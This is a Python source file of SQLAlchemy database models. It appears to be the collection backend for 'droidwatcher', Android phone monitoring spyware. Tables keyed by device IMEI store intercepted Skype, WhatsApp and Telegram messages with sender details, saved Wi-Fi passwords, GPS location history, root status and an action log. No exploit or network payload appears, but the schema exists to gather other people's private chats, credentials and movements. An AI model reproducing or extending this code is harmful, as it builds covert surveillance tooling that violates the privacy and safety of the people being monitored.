from curiosus import bcrypt, db


class User(db.Model):
    __tablename__ = 'user'
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(64), index=True, unique=True)
    password = db.Column(db.String(1024))

    def set_password(self, password):
        self.password = bcrypt.generate_password_hash(password)

    @property
    def is_active(self):
        return True

    @property
    def is_authenticated(self):
        return True

    @property
    def is_anonymous(self):
        return False

    def get_id(self):
        try:
            return self.id
        except AttributeError:
            raise NotImplementedError('No `id` attribute - override `get_id`')

    def __eq__(self, other):
        '''
        Checks the equality of two `UserMixin` objects using `get_id`.
        '''
        if isinstance(other, User):
            return self.get_id() == other.get_id()
        return NotImplemented

    def __ne__(self, other):
        '''
        Checks the inequality of two `UserMixin` objects using `get_id`.
        '''
        equal = self.__eq__(other)
        if equal is NotImplemented:
            return NotImplemented
        return not equal


class Device(db.Model):
    __tablename__ = 'device'
    id = db.Column(db.Integer, primary_key=True)
    serial = db.Column(db.String(64), index=True, unique=True)
    brand = db.Column(db.String(64), index=True)
    model = db.Column(db.String(64), index=True)
    imei = db.Column(db.String(64), index=True, unique=True)
    number = db.Column(db.String(64), index=True)
    android_version = db.Column(db.String(64), index=True)
    email_list = db.Column(db.String(64))
    droidwatcher_version = db.Column(db.String(64), index=True)
    root = db.Column(db.Boolean(), index=True)

    def __repr__(self):
        return '<Device %r>' % (self.serial)


class SkypeAuthor(db.Model):
    __tablename__ = 'skypeauthor'
    id = db.Column(db.Integer, primary_key=True)
    external_id = db.Column(db.String(64), index=True)
    username = db.Column(db.String(64), index=True)
    fullname = db.Column(db.String(64))
    birthday = db.Column(db.Date(), index=True)
    gender = db.Column(db.String(64), index=True)
    country = db.Column(db.String(64), index=True)
    province = db.Column(db.String(64))
    city = db.Column(db.String(64))
    phone = db.Column(db.String(64))
    homepage = db.Column(db.String(64))
    about = db.Column(db.Text(64))
    mood = db.Column(db.String(64))

    def __repr__(self):
        return '<SkypeAuthor %r>' % (self.username)


class SkypeMessage(db.Model):
    __tablename__ = 'skypemessage'
    id = db.Column(db.Integer, primary_key=True)
    device_imei = db.Column(db.String(64), db.ForeignKey('device.imei'))
    device = db.relationship(Device, backref=db.backref("skypemessages", lazy='dynamic'))
    author_id = db.Column(db.String(64), db.ForeignKey('skypeauthor.username'))
    author = db.relationship(SkypeAuthor, backref=db.backref("messages", lazy='dynamic'))
    external_id = db.Column(db.String(64), index=True)
    date = db.Column(db.DateTime())
    message_type = db.Column(db.String(64))
    text = db.Column(db.Text())
    latitude = db.Column(db.Numeric())
    longitude = db.Column(db.Numeric(64))
    extra = db.Column(db.String(64))

    def __repr__(self):
        return '<SkypeMessage %r>' % (self.external_id)


class WhatsAppAuthor(db.Model):
    __tablename__ = 'whatsappauthor'
    id = db.Column(db.Integer, primary_key=True)
    external_id = db.Column(db.String(64), index=True)
    fullname = db.Column(db.String(64))
    phone = db.Column(db.String(64), index=True)
    mood = db.Column(db.String(64))

    def __repr__(self):
        return '<WhatsAppAuthor %r>' % (self.external_id)


class WhatsAppMessage(db.Model):
    __tablename__ = 'whatsappmessage'
    id = db.Column(db.Integer, primary_key=True)
    device_imei = db.Column(db.String(64), db.ForeignKey('device.imei'))
    device = db.relationship(Device, backref=db.backref("whatsappmessages", lazy='dynamic'))
    author_id = db.Column(db.String(64), db.ForeignKey('whatsappauthor.phone'))
    author = db.relationship(WhatsAppAuthor, backref=db.backref("messages", lazy='dynamic'))
    external_id = db.Column(db.String(64), index=True)
    date = db.Column(db.DateTime())
    message_type = db.Column(db.String(64))
    text = db.Column(db.Text())
    latitude = db.Column(db.Numeric())
    longitude = db.Column(db.Numeric(64))

    def __repr__(self):
        return '<WhatsAppMessage %r>' % (self.external_id)


class TelegramAuthor(db.Model):
    __tablename__ = 'telegramauthor'
    id = db.Column(db.Integer, primary_key=True)
    external_id = db.Column(db.String(64), index=True)
    fullname = db.Column(db.String(64))
    extra = db.Column(db.Text())

    def __repr__(self):
        return '<TelegramAuthor %r>' % (self.external_id)


class TelegramMessage(db.Model):
    __tablename__ = 'telegrammessage'
    id = db.Column(db.Integer, primary_key=True)
    device_imei = db.Column(db.String(64), db.ForeignKey('device.imei'))
    device = db.relationship(Device, backref=db.backref("telegrammessages", lazy='dynamic'))
    author_id = db.Column(db.String(64), db.ForeignKey('telegramauthor.external_id'))
    author = db.relationship(TelegramAuthor, backref=db.backref("messages", lazy='dynamic'))
    external_id = db.Column(db.String(64), index=True)
    date = db.Column(db.DateTime())
    message_type = db.Column(db.String(64))
    text = db.Column(db.Text())
    latitude = db.Column(db.Numeric())
    longitude = db.Column(db.Numeric(64))

    def __repr__(self):
        return '<TelegramMessage %r>' % (self.external_id)


class WirelessPassword(db.Model):
    __tablename__ = 'wirelesspassword'
    id = db.Column(db.Integer, primary_key=True)
    device_imei = db.Column(db.String(64), db.ForeignKey('device.imei'))
    device = db.relationship(Device, backref=db.backref("wirelesspasswords", lazy='dynamic'))
    date = db.Column(db.DateTime())
    essid = db.Column(db.String(64), index=True)
    password = db.Column(db.String(64))
    key_management = db.Column(db.String(64))
    latitude = db.Column(db.Numeric())
    longitude = db.Column(db.Numeric(64))

    __table_args__ = (db.UniqueConstraint('device_imei', 'essid', 'password', name='_device_essid_password_uc'),
                      )

    def __repr__(self):
        return '<WirelessPassword %r>' % (self.essid)


class Location(db.Model):
    __tablename__ = "location"
    id = db.Column(db.Integer, primary_key=True)
    device_imei = db.Column(db.String(64), db.ForeignKey('device.imei'))
    device = db.relationship(Device, backref=db.backref("locations", lazy='dynamic'))
    date = db.Column(db.DateTime())
    battery = db.Column(db.Integer())
    provider = db.Column(db.String(64))
    latitude = db.Column(db.Numeric(64))
    longitude = db.Column(db.Numeric(64))


class ActionLog(db.Model):
    __tablename__ = 'actionlog'
    id = db.Column(db.Integer, primary_key=True)
    device_imei = db.Column(db.String(64), db.ForeignKey('device.imei'))
    device = db.relationship(Device, backref=db.backref("actionlogs", lazy='dynamic'))
    date = db.Column(db.DateTime())
    table = db.Column(db.String(64), index=True)
    message = db.Column(db.String(64))
